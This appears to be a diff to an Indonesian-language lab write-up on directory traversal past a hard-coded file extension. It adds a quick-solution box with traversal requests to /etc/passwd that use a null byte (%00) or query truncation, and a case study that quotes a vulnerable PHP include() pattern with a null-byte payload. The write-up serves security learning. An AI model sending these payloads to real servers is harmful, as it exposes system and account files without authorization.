@@ -1,5 +1,20 @@
 # Directory Traversal: Bypassing Hardcoded Extension (Null Byte & Truncation)
 
+> [!TIP]
+> ### ⚡ Cara Cepat / Quick Solution (Langsung Praktik)
+> 1. Tangkap request gambar di Burp Repeater:
+>    ```http
+>    GET /image?filename=25.jpg HTTP/1.1
+>    ```
+> 2. Gunakan **Null Byte Injection (`%00`)** untuk memotong ekstensi bawaan yang dipaksakan server:
+>    ```http
+>    GET /image?filename=../../../etc/passwd%00.jpg HTTP/1.1
+>    ```
+> 3. *(Alternatif)*: Gunakan query truncation: `GET /image?filename=../../../etc/passwd? HTTP/1.1`.
+> 4. Klik **Send** $\rightarrow$ ekstensi terpotong dan file `/etc/passwd` berhasil diekstrak.
+
+---
+
 Dalam pengembangan aplikasi web, salah satu pola paling umum untuk membatasi akses berkas adalah dengan **mengunci ekstensi berkas secara kaku (_hardcoded file extension_)** di sisi backend, misalnya menambahkan akhiran `.png`, `.jpg`, atau `.php` secara otomatis.
 
 Ketika pengembang menulis kode seperti ini, mereka berasumsi bahwa penyerang tidak akan bisa membaca berkas sistem penting seperti `/etc/passwd` karena server akan selalu mencari `/etc/passwd.png` (yang tidak pernah ada).
@@ -206,6 +221,14 @@ peter:x:1002:1002:Peter:/home/peter:/bin/bash
 3. Lab berhasil diselesaikan (*Solved*)! 🎉
 
 ---
+
+## 🌍 Studi Kasus Nyata di Industri (Real-World Case Study)
+
+### PHP Null Byte Injection (CVE-2006-7243) & Eksploitasi File Inclusion
+Pemotongan ekstensi file menggunakan Null Byte adalah salah satu teknik legendaris dalam sejarah keamanan web:
+* **Akar Masalah di Level C:** Bahasa pemrograman C (yang mendasari interpreter PHP versi lama dan modul server Apache) menggunakan byte `0x00` (` `) sebagai penanda akhir sebuah string (*null terminator*).
+* **Eksploitasi Nyata di CMS:** Banyak plugin CMS lawas memanggil file dengan kode `include("templates/" . $_GET['theme'] . ".php")`. Penyerang mengirimkan payload `theme=../../../../etc/passwd%00`. Ketika kernel sistem operasi membaca path tersebut, pembacaan string berhenti tepat sebelum `%00`, mengabaikan ekstensi `.php`, dan langsung menyajikan isi file `/etc/passwd`.
+* **Evolusi Keamanan:** Celah ini begitu berbahaya sehingga PHP akhirnya merombak penanganan string di level core pada PHP 5.3.4+ untuk melarang null byte di seluruh fungsi berkas sistem.
 
 ## 5. Bedah Kode Backend: Rentan vs Aman
 
